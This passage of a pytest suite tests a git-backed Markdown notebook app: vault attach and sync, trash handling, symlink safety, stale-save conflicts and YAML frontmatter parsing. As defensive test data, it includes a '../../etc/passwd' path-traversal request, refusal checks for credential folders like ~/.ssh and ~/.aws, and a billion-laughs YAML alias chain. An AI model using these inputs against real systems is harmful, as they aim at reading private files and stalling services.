        assert (root / "One.md").exists()
        assert list((root / "public").iterdir()) == []
        # The reveal route refuses it for the same reason, rather than opening
        # whatever the link points at.
        open_status, open_body = await client.post("/api/trash/open", {})
        assert open_status >= 400, open_body
        assert "symlink" in open_body["error"]


@requires_symlinks
@pytest.mark.asyncio
async def test_trashing_a_symlink_leaves_its_target_alone(fixtures) -> None:
    """A trashed alias is moved as the LINK, never followed.

    `os.replace` does not follow a final-component symlink, so deleting an in-vault
    alias moves the link entry and leaves the note it points at — and that note's
    mtime — completely alone.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        target = root / "One.md"
        ancient = time.time() - 900 * 86400
        os.utime(target, (ancient, ancient))
        alias = root / "Alias.md"
        alias.symlink_to("One.md")

        assert (await client.delete("/api/note?path=Alias.md"))[0] == 200
        trashed = root / git_ops.TRASH_DIR / "Alias.md"
        # The link moved as itself, and the target it pointed at is untouched.
        assert trashed.is_symlink()
        assert target.exists()
        assert abs(target.stat().st_mtime - ancient) < 2

        # The note itself is still a normal note, and the alias is gone from the
        # listing (the walk prunes dotted directories).
        paths = [n["path"] for n in (await client.get("/api/notes"))[1]["notes"]]
        assert "One.md" in paths
        assert "Alias.md" not in paths


@pytest.mark.asyncio
async def test_sync_never_stages_a_pre_existing_trash(fixtures) -> None:
    """An attached vault can arrive with an Obsidian `.trash/` that this app never
    put there. Nothing writes a git ignore rule for it, so staging exactly the paths
    `status()` reported — which filters the trash — is the ONLY thing keeping that
    folder out of the commit and off the remote. A scope-wide `add -A` would sweep
    it up and push notes the user deleted elsewhere."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        trash = root / git_ops.TRASH_DIR
        trash.mkdir(parents=True, exist_ok=True)
        (trash / "secret.md").write_text("private, deleted in Obsidian\n", encoding="utf-8")
        # No delete has happened, so nothing has written the exclude entry yet.
        exclude = root / ".git" / "info" / "exclude"
        assert not exclude.exists() or git_ops.TRASH_DIR not in exclude.read_text(
            encoding="utf-8"
        )
        assert (
            await client.put("/api/note", {"path": "One.md", "content": "# One\n\nedit\n"})
        )[0] == 200

        status, body = await client.post("/api/sync")
        assert status == 200, body
        committed = [c["path"] for c in body["result"]["committed"]]
        assert committed == ["One.md"]
        assert not any(git_ops.TRASH_DIR in p for p in committed)
        # Nothing under .trash ever entered the index.
        assert git_ops.TRASH_DIR not in _git("ls-files", cwd=root)
        assert (trash / "secret.md").exists()


@pytest.mark.asyncio
async def test_attach_rejects_non_repo(fixtures, tmp_path: Path) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        plain = tmp_path / "plain"
        plain.mkdir()
        status, body = await client.post("/api/vaults/attach", {"path": str(plain)})
        assert status == 400
        assert body["code"] == "ENOGIT"


@pytest.mark.asyncio
async def test_attach_refuses_duplicate(fixtures) -> None:
    _mod, _remote, seed = fixtures
    async with signed_client(_mod) as client:
        assert (await client.post("/api/vaults/attach", {"path": str(seed)}))[0] == 200
        status, body = await client.post("/api/vaults/attach", {"path": str(seed)})
        assert status == 409
        assert "already attached" in body["error"]


@pytest.mark.asyncio
async def test_attach_refuses_a_sensitive_path(fixtures, monkeypatch) -> None:
    """A folder resolving into a protected location (~/.ssh, ~/.aws, ...) must
    not be attachable — sync's `git add -A` would otherwise stage credentials
    without passing through the per-file sensitive-path gate."""
    server_mod, _remote, seed = fixtures
    async with signed_client(server_mod) as client:
        monkeypatch.setattr(server_mod.hooks, "is_sensitive_path", lambda p: True)
        status, body = await client.post("/api/vaults/attach", {"path": str(seed)})
        assert status == 403, body
        assert body["code"] == "sensitive_path"


@pytest.mark.asyncio
async def test_attach_refuses_a_folder_containing_a_sensitive_path(fixtures, monkeypatch) -> None:
    """An ANCESTOR of a protected location must be refused too. The home
    directory is not itself a sensitive path, but it CONTAINS ~/.ssh — sync's
    `git add -A` from that root would stage and push the credential store
    wholesale, so the reverse-direction gate must also block the attach."""
    server_mod, _remote, seed = fixtures
    async with signed_client(server_mod) as client:
        monkeypatch.setattr(server_mod.security, "path_contains_sensitive", lambda p: True)
        status, body = await client.post("/api/vaults/attach", {"path": str(seed)})
        assert status == 403, body
        assert body["code"] == "sensitive_path"
        assert "contains" in body["error"]


def test_path_contains_sensitive_flags_ancestors_of_credentials(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """The reverse-direction gate flags the home directory (it contains
    ``~/.ssh``) and any ancestor of a protected location — WITHOUT needing the
    credential paths to exist on disk, and without walking the tree."""
    from kiro_crew import security

    home = tmp_path / "home"
    home.mkdir()
    # Path.home() reads HOME on POSIX and USERPROFILE on Windows.
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    monkeypatch.delenv("KIROCREW_HOME", raising=False)
    # The home dir itself: not sensitive, but it CONTAINS ~/.ssh et al.
    assert security.is_sensitive_path(str(home)) is False
    assert security.path_contains_sensitive(str(home)) is True
    # Any ancestor of home is transitively an ancestor of ~/.ssh.
    assert security.path_contains_sensitive(str(tmp_path)) is True
    # A sibling tree containing no protected location stays attachable.
    benign = tmp_path / "elsewhere" / "notes"
    benign.mkdir(parents=True)
    assert security.path_contains_sensitive(str(benign)) is False
    # A custom KIROCREW_HOME re-anchors the crew secret leaves — a folder
    # containing THAT must be refused as well (the Notes PAT lives there).
    crew = tmp_path / "elsewhere" / "notes" / "crew"
    monkeypatch.setenv("KIROCREW_HOME", str(crew))
    assert security.path_contains_sensitive(str(benign)) is True


@pytest.mark.asyncio
async def test_clone_vault_ids_are_unique(fixtures) -> None:
    """Vault ids must be uuids, not millisecond timestamps — two clones in the
    same millisecond would otherwise collide on the same id and clone dir."""
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        v1 = await _clone(client, remote)
        v2 = await _clone(client, remote)
        assert v1["id"] != v2["id"]
        assert len(v1["id"]) > 20, v1["id"]  # uuid hex, not a short timestamp


@pytest.mark.asyncio
async def test_attach_expands_leading_tilde(fixtures, monkeypatch, tmp_path: Path) -> None:
    """A `~/...` path expands to home — without using it as a regex replacement.

    `str(Path.home())` on Windows is `C:\\Users\\...`; feeding it to `re.sub` as
    the replacement made `\\U` a bad escape and 500'd every attach on Windows,
    because `re.sub` parses the replacement template even when nothing matches.
    """
    server_mod, _remote, _seed = fixtures
    home = tmp_path / "home"
    (home / "notebook").mkdir(parents=True)
    monkeypatch.setattr(server_mod.Path, "home", staticmethod(lambda: home))
    async with signed_client(server_mod) as client:
        # A non-repo folder: reaching the ENOGIT check proves the path expanded
        # and resolved without a regex-escape crash (the Windows failure mode).
        status, body = await client.post("/api/vaults/attach", {"path": "~/notebook"})
        assert status == 400, body
        assert body["code"] == "ENOGIT"


def test_pat_stays_under_crew_home_ignoring_md_notebook_home(monkeypatch, tmp_path: Path) -> None:
    """MD_NOTEBOOK_HOME may relocate vaults, but the PAT must stay under the
    crew data home so it remains behind is_sensitive_path()'s floor. Pointing
    MD_NOTEBOOK_HOME at an unprotected dir must not move the credential there."""
    crew = tmp_path / "crew"
    stray = tmp_path / "stray"
    monkeypatch.setenv("KIROCREW_HOME", str(crew))
    monkeypatch.setenv("MD_NOTEBOOK_HOME", str(stray))
    from kiro_crew.apps.builtins.md_notebook import server as server_mod

    server_mod = importlib.reload(server_mod)
    pat = server_mod._pat_file()
    # The PAT is under the crew data home, NOT the stray MD_NOTEBOOK_HOME.
    assert str(stray) not in str(pat), pat
    assert pat.parts[-3:] == ("workspace", "md-notebook", "pat"), pat
    assert str(crew) in str(pat), pat
    # settings.json carries `autoSync` (authorizes unattended push), so like the
    # PAT it MUST stay under the crew data home behind the sensitive-path floor —
    # MD_NOTEBOOK_HOME must not relocate it to an unprotected dir an agent could
    # write.
    settings = server_mod._settings_json()
    assert str(stray) not in str(settings), settings
    assert str(crew) in str(settings), settings
    # The vault REGISTRY carries each vault's push target (remoteUrl/gitDir) that
    # the unattended sync loop trusts, so vaults.json is fenced under the crew data
    # home too — MD_NOTEBOOK_HOME must not relocate it where an agent could repoint
    # the push.
    vaults = server_mod._vaults_json()
    assert str(stray) not in str(vaults), vaults
    assert str(crew) in str(vaults), vaults
    # The clone DATA, by contrast, is bulk per-instance content and DOES follow
    # MD_NOTEBOOK_HOME.
    assert str(stray) in str(server_mod._clone_root())


def test_default_home_follows_kirocrew_home(monkeypatch, tmp_path: Path) -> None:
    """An isolated instance keeps its own vaults instead of the production ones.

    Deriving the data root from ``Path.home()`` ignored ``KIROCREW_HOME``, so a
    dev gateway (``KIROCREW_HOME=.kirocrew-dev``) would load and edit the real
    ~/.kiro/crew notes. ``_default_home`` now routes through ``config_dir()``.
    """
    from kiro_crew.apps.builtins.md_notebook import server as server_mod

    iso = tmp_path / "iso-home"
    monkeypatch.setenv("KIROCREW_HOME", str(iso))
    home = server_mod._default_home()
    assert str(home).startswith(str(iso.resolve()))
    assert home.name == server_mod.APP_NAME


@pytest.mark.asyncio
async def test_forget_vault_keeps_files(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        status, body = await client.delete(f"/api/vaults?vault={vault['id']}")
        assert status == 200
        # Forgetting drops the descriptor only — the clone stays on disk.
        assert Path(body["localPath"]).exists()
        assert (await client.get("/api/vaults"))[1]["vaults"] == []


@pytest.mark.asyncio
async def test_forget_unknown_vault(fixtures) -> None:
    server_mod, _remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        status, _ = await client.delete("/api/vaults?vault=nope")
        assert status == 404


@pytest.mark.asyncio
async def test_concurrent_clones_do_not_lose_a_vault(fixtures) -> None:
    """Two concurrent vault mutations must not lose an update: the vaults.json
    read-modify-write is serialized by a shared lock."""
    import asyncio as _asyncio

    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        r1, r2 = await _asyncio.gather(
            client.post("/api/vaults", {"url": str(remote)}),
            client.post("/api/vaults", {"url": str(remote)}),
        )
        assert r1[0] == 200 and r2[0] == 200, (r1, r2)
        _, listing = await client.get("/api/vaults")
        assert len(listing["vaults"]) == 2, listing


def test_vault_registry_commit_retries_windows_sharing_violation(
    fixtures, monkeypatch
) -> None:
    """A transient Windows handle on vaults.json must not lose a clone.

    Clone/attach mutations are serialized, but Windows Search or an AV scanner
    can still hold the registry open when the atomic rename lands. The shared
    retry helper absorbs that bounded sharing-violation window.
    """
    server_mod, _remote, _seed = fixtures
    monkeypatch.setattr(platform_compat, "IS_WINDOWS", True)
    monkeypatch.setattr(atomic_write_mod, "_REPLACE_BACKOFF_SECONDS", 0)
    vaults = [{"id": "v1", "localPath": "vault-one"}]

    with replace_sharing_violation(match="vaults.json", times=1) as state:
        server_mod._write_vaults_sync(vaults)

    assert json.loads(server_mod._vaults_json().read_text(encoding="utf-8")) == vaults
    assert state["n"] == 2, "the transient rename must be retried exactly once"


# ---------------------------------------------------------------------------
# Notes
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_note_listing(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.get("/api/notes")
        assert status == 200
        by_path = {n["path"]: n for n in body["notes"]}
        assert set(by_path) == {"One.md", "sub/Two.md"}
        # The filename is the label. The seed's frontmatter `title` happens to
        # equal its filename, so the divergent case is pinned separately below.
        assert by_path["sub/Two.md"]["title"] == "Two"
        assert by_path["One.md"]["title"] == "One"
        assert by_path["One.md"]["createdAt"] > 0
        assert by_path["One.md"]["syncStatus"] == "synced"


@pytest.mark.asyncio
async def test_display_name_is_the_filename_not_a_frontmatter_title(fixtures) -> None:
    """A frontmatter ``title`` names a wikilink target, not the note in the rail.

    One note must read the same on every surface -- the rail row, the editor header
    and a search hit -- because the rail's rename field is seeded from that label
    and renames the FILE. So display is the filename, while a link written against
    a frontmatter title still resolves.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        named = {"path": "Named.md", "content": "---\ntitle: A Different Title\n---\n\nbody\n"}
        linker = {"path": "Linker.md", "content": "points at [[A Different Title]]\n"}
        assert (await client.put("/api/note", named))[0] == 200
        assert (await client.put("/api/note", linker))[0] == 200

        status, body = await client.get("/api/notes")
        assert status == 200, body
        assert {n["path"]: n["title"] for n in body["notes"]}["Named.md"] == "Named"

        # A search hit reads the same as the tree row for the same note, which also
        # means the filename is what the boosted field matches on.
        status, body = await client.get("/api/search?q=Named")
        assert status == 200, body
        assert {r["path"]: r["title"] for r in body["results"]}["Named.md"] == "Named"

        # Resolution is unchanged: the frontmatter title is still a link target.
        status, body = await client.get("/api/note?path=Named.md")
        assert status == 200, body
        assert [b["sourcePath"] for b in body["backlinks"]] == ["Linker.md"]


@pytest.mark.asyncio
async def test_read_note_with_backlinks(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.get("/api/note?path=sub/Two.md")
        assert status == 200
        assert "body #tag" in body["content"]
        assert body["mtime"] > 0
        assert "tag" in body["meta"]["tags"]
        # One.md links to [[Two]], which resolves by frontmatter title.
        assert [b["sourcePath"] for b in body["backlinks"]] == ["One.md"]


@pytest.mark.asyncio
async def test_note_read_snapshots_mtime_before_content(fixtures, monkeypatch) -> None:
    """The read must return an mtime no newer than the content it returns.

    If an external atomic save races the read, stat-before-read yields (old
    mtime, newer content) so the next save safely conflicts. Read-before-stat
    would hand back a fresh token for stale content, letting the next app save
    silently clobber the external edit.
    """
    server_mod, remote, _seed = fixtures
    async with signed_client(server_mod) as client:
        vault = await _clone(client, remote)
        note = Path(vault["localPath"]) / "One.md"
        future = time.time() + 1000

        real_read = server_mod.read_note_text

        async def racing_read(path: Path):
            # Simulate an external atomic save landing DURING the read by bumping
            # the file's mtime far into the future before content comes back.
            os.utime(note, (future, future))
            return await real_read(path)

        monkeypatch.setattr(server_mod, "read_note_text", racing_read)

        status, body = await client.get("/api/note?path=One.md")
        assert status == 200
        # The returned token must predate the racing save (stat ran first).
        assert body["mtime"] < future * 1000, body["mtime"]


@pytest.mark.asyncio
async def test_save_note(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.put(
            "/api/note", {"path": "One.md", "content": "# One\n\nedited\n"}
        )
        assert status == 200
        assert body["mtime"] > 0
        _, read = await client.get("/api/note?path=One.md")
        assert "edited" in read["content"]


@pytest.mark.asyncio
async def test_save_guard_rejects_stale_write(fixtures) -> None:
    """A note edited outside the app must not be silently clobbered."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        _, read = await client.get("/api/note?path=One.md")
        stale_mtime = read["mtime"]

        # Simulate an external edit after the read.
        target = Path(vault["localPath"]) / "One.md"
        time.sleep(0.01)
        target.write_text("# One\n\nchanged by another program\n", encoding="utf-8")

        status, body = await client.put(
            "/api/note",
            {"path": "One.md", "content": "mine", "baseMtime": stale_mtime},
        )
        assert status == 409
        assert body["code"] == "ESTALE"
        # The response carries what is actually on disk so the UI can offer a merge.
        assert "another program" in body["disk"]
        assert target.read_text(encoding="utf-8") == "# One\n\nchanged by another program\n"


@pytest.mark.asyncio
async def test_save_guard_treats_external_deletion_as_conflict(fixtures) -> None:
    """A note deleted outside the app must not be silently recreated."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        _, read = await client.get("/api/note?path=One.md")

        # Simulate an external deletion (Obsidian, `git pull`) after the read.
        target = Path(vault["localPath"]) / "One.md"
        target.unlink()

        status, body = await client.put(
            "/api/note",
            {"path": "One.md", "content": "mine", "baseMtime": read["mtime"]},
        )
        assert status == 409
        assert body["code"] == "ESTALE"
        # The deleted file stays deleted — the write did not resurrect it.
        assert not target.exists()

        # "Keep mine" echoes the -1 sentinel back, which recreates the note so
        # the edit is not stuck in an unresolvable conflict loop.
        assert body["mtime"] == -1
        status, ok = await client.put(
            "/api/note",
            {"path": "One.md", "content": "mine", "baseMtime": body["mtime"]},
        )
        assert status == 200, ok
        assert target.read_text(encoding="utf-8") == "mine"


@pytest.mark.asyncio
async def test_save_allows_matching_mtime(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        _, read = await client.get("/api/note?path=One.md")
        status, _ = await client.put(
            "/api/note", {"path": "One.md", "content": "fresh", "baseMtime": read["mtime"]}
        )
        assert status == 200


@pytest.mark.asyncio
async def test_path_traversal_is_refused(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, _ = await client.get("/api/note?path=../../etc/passwd")
        assert status == 400
        status, _ = await client.put(
            "/api/note", {"path": "../escape.md", "content": "nope"}
        )
        assert status == 400


@pytest.mark.asyncio
async def test_delete_note(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        status, _ = await client.delete("/api/note?path=One.md")
        assert status == 200
        assert not (Path(vault["localPath"]) / "One.md").exists()


@pytest.mark.asyncio
async def test_deleting_an_alias_symlink_keeps_the_target(fixtures) -> None:
    """Deleting an in-vault alias must remove the link, not its target note.

    `safe_join` resolves `alias.md -> One.md` to `One.md`; unlinking that path
    would destroy the real note and leave a broken alias. Delete must act on the
    named entry.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        target = root / "One.md"
        original = target.read_text(encoding="utf-8")
        alias = root / "alias.md"
        try:
            alias.symlink_to("One.md")
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not supported on this platform/filesystem")

        status, _ = await client.delete("/api/note?path=alias.md")
        assert status == 200
        assert not alias.exists() and not alias.is_symlink(), "the alias should be gone"
        assert target.exists(), "the real note must survive"
        assert target.read_text(encoding="utf-8") == original


@pytest.mark.asyncio
async def test_saving_through_a_symlink_is_refused(fixtures) -> None:
    """A note that is a symlink (e.g. a cloned `alias.md -> One.md`) must not
    have its save follow the link and overwrite the target file."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        target = root / "One.md"
        original = target.read_text(encoding="utf-8")
        alias = root / "alias.md"
        try:
            alias.symlink_to("One.md")
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not supported on this platform/filesystem")

        status, body = await client.put("/api/note", {"path": "alias.md", "content": "pwned"})
        assert status == 400, body
        assert body["code"] == "note_is_symlink"
        assert target.read_text(encoding="utf-8") == original, "target must be untouched"
        assert alias.is_symlink(), "the alias must remain a symlink, not become a file"


@pytest.mark.asyncio
async def test_move_refuses_a_dangling_symlink_destination(fixtures) -> None:
    """A move onto a DANGLING symlink must be refused, not silently replace it.

    `dst.exists()` follows the link and reads a dangling target as absent, so
    without an `is_symlink()` guard os.rename would delete that directory entry.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        dangling = root / "dst.md"
        try:
            dangling.symlink_to("nonexistent-target.md")
        except (OSError, NotImplementedError):
            pytest.skip("symlinks not supported on this platform/filesystem")
        assert dangling.is_symlink() and not dangling.exists()
        status, body = await client.post(
            "/api/note/move", {"from": "One.md", "to": "dst.md"}
        )
        assert status == 409, body
        assert dangling.is_symlink(), "the dangling symlink must be left untouched"
        assert (root / "One.md").exists(), "the source note must not have moved"


@pytest.mark.asyncio
async def test_reads_normalize_crlf_to_lf(fixtures) -> None:
    """A CRLF note (Obsidian on Windows / autocrlf) must read back as LF."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        (Path(vault["localPath"]) / "crlf.md").write_bytes(b"# T\r\n\r\nline\r\n")
        _, read = await client.get("/api/note?path=crlf.md")
        assert "\r" not in read["content"]
        assert read["content"] == "# T\n\nline\n"


@pytest.mark.asyncio
async def test_reads_a_note_with_an_unquoted_frontmatter_date(fixtures) -> None:
    """An unquoted YAML date in frontmatter must not 500 the read.

    `yaml.safe_load` turns `date: 2026-08-01` into a `datetime.date`, which
    `json.dumps` rejects — the metadata is now coerced to a string.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        (Path(vault["localPath"]) / "dated.md").write_text(
            "---\ndate: 2026-08-01\ncreated: 2026-08-01 09:30:00\n---\n\nbody\n",
            encoding="utf-8",
        )
        status, read = await client.get("/api/note?path=dated.md")
        assert status == 200, read
        assert read["meta"]["frontmatter"]["date"] == "2026-08-01"


@pytest.mark.asyncio
async def test_reads_a_note_with_cyclic_frontmatter(fixtures) -> None:
    """A self-referential YAML alias is valid YAML but not JSON-serializable, so
    the read must still succeed — the cyclic back-edge is coerced to null."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        (Path(vault["localPath"]) / "cyclic.md").write_text(
            "---\nloop: &loop [*loop]\n---\n\nbody\n", encoding="utf-8"
        )
        status, read = await client.get("/api/note?path=cyclic.md")
        assert status == 200, read
        assert read["meta"]["frontmatter"] == {"loop": [None]}


@pytest.mark.asyncio
async def test_reads_a_note_with_aliased_frontmatter_fast(fixtures) -> None:
    """Nested YAML anchors share nodes; the listing path must coerce them
    without expanding into an exponential tree (billion-laughs), which would
    wedge the event loop across a cloned vault of many notes."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        fm = "---\nl0: &l0 [1]\n"
        for i in range(1, 22):
            fm += f"l{i}: &l{i} [*l{i - 1}, *l{i - 1}]\n"
        fm += "---\n\nbody\n"
        (Path(vault["localPath"]) / "amp.md").write_text(fm, encoding="utf-8")
        # The listing path (note_title/tags) parses frontmatter but does not
        # serialize it; with memoization this stays fast, without it 2**21 nodes
        # would be materialized and wedge the loop.
        #
        # The budget is measured RELATIVE to the same request against the vault
        # without the amplifying note, not as a fixed wall-clock span: a bare
        # "< 5s" is the same order as one scheduler stall on a loaded parallel
        # runner (git.exe process spawns on Windows make this request tens of
        # times more expensive than on Linux), so it failed on a correct
        # implementation. Containment is a RATIO property — un-memoized, 2**21
        # nodes is thousands of times the baseline, so a generous multiplier
        # still catches the regression this test exists for.
        amp = Path(vault["localPath"]) / "amp.md"
        amp_text = amp.read_text(encoding="utf-8")
        amp.unlink()
        baseline_start = time.monotonic()
        status, body = await client.get("/api/notes")
        baseline = time.monotonic() - baseline_start
        assert status == 200, body

        amp.write_text(amp_text, encoding="utf-8")
        start = time.monotonic()
        status, body = await client.get("/api/notes")
        elapsed = time.monotonic() - start
        assert status == 200, body
        # Floor the baseline so a sub-millisecond measurement can't make the
        # budget unsatisfiable, and allow generous headroom over it.
        budget = max(baseline, 0.05) * 20 + 1.0
        assert elapsed < budget, (
            f"alias amplification was not contained: {elapsed:.2f}s vs a "
            f"{budget:.2f}s budget (baseline {baseline:.2f}s)"
        )


def test_json_safe_collapses_repeated_aliases(fixtures) -> None:
    """_json_safe must collapse a repeated/aliased node to null on its second
    occurrence, so neither the walk nor json.dumps re-expands a shared DAG into
    an exponential tree (billion-laughs)."""
    server_mod, _remote, _seed = fixtures
    notes_mod = server_mod.notes_mod
    import json

    import yaml

    parsed = yaml.safe_load("a: &a [1, 2]\nb: [*a, *a]\n")
    assert parsed["b"][0] is parsed["b"][1]  # check: YAML shares the alias
    safe = notes_mod._json_safe(parsed)
    # First full occurrence kept; every later reference collapsed to null.
    assert safe["a"] == [1, 2]
    assert safe["b"] == [None, None]
    # And it serializes to bounded, valid JSON.
    assert json.loads(json.dumps(safe)) == safe


@pytest.mark.asyncio
async def test_reads_a_note_with_non_finite_frontmatter(fixtures) -> None:
    """`.nan` / `.inf` are Python floats but not valid JSON — coerced to strings
    so the browser's JSON.parse does not reject the response."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        (Path(vault["localPath"]) / "nan.md").write_text(
            "---\nx: .nan\ny: .inf\n---\n\nbody\n", encoding="utf-8"
        )
        status, read = await client.get("/api/note?path=nan.md")
        assert status == 200, read
        fm = read["meta"]["frontmatter"]
        assert isinstance(fm["x"], str) and isinstance(fm["y"], str)


@pytest.mark.asyncio
async def test_new_note_names_are_unique(fixtures) -> None:
    """Two quick creations must not collide on a name."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        first = (await client.post("/api/note/new"))[1]["path"]
        second = (await client.post("/api/note/new"))[1]["path"]
        assert first == "Untitled.md"
        assert second == "Untitled 2.md"
        _, read = await client.get(f"/api/note?path={first}")
        # Created empty: the filename is already the title (`note_title` falls back
        # to the basename), so a seeded `# Untitled` heading was a duplicate the
        # user had to delete — and it did not follow a later rename.
        assert read["content"] == ""
        # ...and the listing still names it, from the filename alone.
        titles = {n["path"]: n["title"] for n in (await client.get("/api/notes"))[1]["notes"]}
        assert titles[first] == "Untitled"


@pytest.mark.asyncio
async def test_new_note_in_folder(fixtures) -> None:
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        status, body = await client.post("/api/note/new", {"folder": "sub"})
        assert status == 200
        assert body["path"] == "sub/Untitled.md"


@pytest.mark.asyncio
async def test_delete_moves_the_note_into_the_local_trash(fixtures) -> None:
    """Delete is recoverable: the file lands in .trash, not the void."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        before = (root / "One.md").read_text(encoding="utf-8")
        status, body = await client.delete("/api/note?path=One.md")
        assert status == 200, body
        assert body["trashed"] == ".trash/One.md"
        assert not (root / "One.md").exists()
        assert (root / ".trash" / "One.md").read_text(encoding="utf-8") == before
        # And it is gone from the listing — the walk prunes dotted directories.
        paths = [n["path"] for n in (await client.get("/api/notes"))[1]["notes"]]
        assert "One.md" not in paths
        assert not any(p.startswith(".trash") for p in paths)


@pytest.mark.asyncio
async def test_trash_does_not_overwrite_a_same_named_note(fixtures) -> None:
    """Two notes with one filename in different folders both survive deletion."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / "sub" / "One.md").write_text("# nested one\n", encoding="utf-8")
        assert (await client.delete("/api/note?path=One.md"))[1]["trashed"] == ".trash/One.md"
        second = (await client.delete("/api/note?path=sub/One.md"))[1]["trashed"]
        assert second == ".trash/One 2.md"
        assert (root / ".trash" / "One 2.md").read_text(encoding="utf-8") == "# nested one\n"


@pytest.mark.asyncio
async def test_sync_refuses_rather_than_pushing_a_subset(fixtures) -> None:
    """An explicit Sync must not commit only part of what the user asked for.

    `status()` reports a rename as TWO entries — old path deleted, new path added —
    and the argv cap slices a path-sorted list, so the cutoff can fall between them.
    Pushing only the deletion half makes the note look deleted to every other clone
    while the UI reports success. The autosave keeps the cap (it pushes nothing, and
    the next tick repairs a split), so it must still succeed here.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        remote_before = _git("rev-parse", "HEAD", cwd=Path(remote))
        for n in range(git_ops.MAX_STAGED_PATHS + 1):
            (root / f"bulk-{n:04d}.md").write_text(f"# Bulk {n}\n", encoding="utf-8")

        status, body = await client.post("/api/sync")
        assert status >= 400, body
        assert str(git_ops.MAX_STAGED_PATHS) in body["error"]
        # Nothing was committed locally and nothing reached the remote.
        assert _git("rev-parse", "HEAD", cwd=Path(remote)) == remote_before

        # The autosave still drains them in batches — capped, never refused.
        commit_status, commit_body = await client.post("/api/commit")
        assert commit_status == 200, commit_body
        assert len(commit_body["result"]["committed"]) == git_ops.MAX_STAGED_PATHS
        second_status, second_body = await client.post("/api/commit")
        assert second_status == 200, second_body
        assert len(second_body["result"]["committed"]) == 1
        # Drained, so a Sync is possible again.
        assert (await client.post("/api/sync"))[0] == 200


@pytest.mark.asyncio
async def test_sync_never_commits_the_trash(fixtures) -> None:
    """A deleted note must not be pushed to the remote.

    `git add -A` stages from the working tree rather than from the status list,
    so the pathspec exclusion is what actually enforces this.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        assert (await client.delete("/api/note?path=One.md"))[0] == 200
        status, body = await client.post("/api/sync")
        assert status == 200, body
        committed = [c["path"] for c in body["result"]["committed"]]
        assert not any(".trash" in p for p in committed)
        assert "One.md" in committed  # the deletion itself IS committed
        # Nothing under .trash reached the index at any point.
        tracked = _git("ls-files", cwd=Path(_seed))
        assert ".trash" not in tracked


@pytest.mark.asyncio
async def test_delete_refreshes_backlinks(fixtures) -> None:
    """Deleting a linking note drops the backlink it contributed."""
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        await _clone(client, remote)
        # One.md links to [[Two]]; deleting it must leave Two with no backlinks.
        assert (await client.delete("/api/note?path=One.md"))[0] == 200
        _, target = await client.get("/api/note?path=sub/Two.md")
        assert target["backlinks"] == []


@pytest.mark.asyncio
async def test_sync_works_when_the_vault_already_ignores_the_trash(fixtures) -> None:
    """The Obsidian case: `.trash/` is in the vault's own .gitignore.

    Regression for a real break. Keeping the trash out via an `:(exclude,literal)`
    pathspec made `git add` treat `.trash` as an EXPLICITLY named ignored path and
    fail the whole add ("use -f if you really want to add them", exit 1) — so sync
    died in precisely the vaults most likely to have a trash folder already. No
    pathspec names the trash now: staging lists only the paths `status()` reported,
    and `status()` filters it out.
    """
    _mod, remote, _seed = fixtures
    async with signed_client(_mod) as client:
        vault = await _clone(client, remote)
        root = Path(vault["localPath"])
        (root / ".gitignore").write_text(".trash/\n", encoding="utf-8")
